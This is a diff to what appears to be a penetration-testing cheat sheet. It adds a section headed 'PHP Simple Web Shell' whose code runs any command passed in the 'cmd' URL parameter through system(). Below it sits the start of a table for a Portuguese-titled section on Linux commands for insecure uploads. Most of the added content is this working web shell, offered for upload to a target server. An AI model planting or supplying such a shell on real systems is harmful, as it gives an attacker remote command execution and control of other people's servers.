@@ -1,3 +1,12 @@
+## PHP Simple Web Shell
+```
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+```
+
 ## Comandos Linux para Upload Inseguro
 | Command  | Description                                                                 |
 |----------|-----------------------------------------------------------------------------|
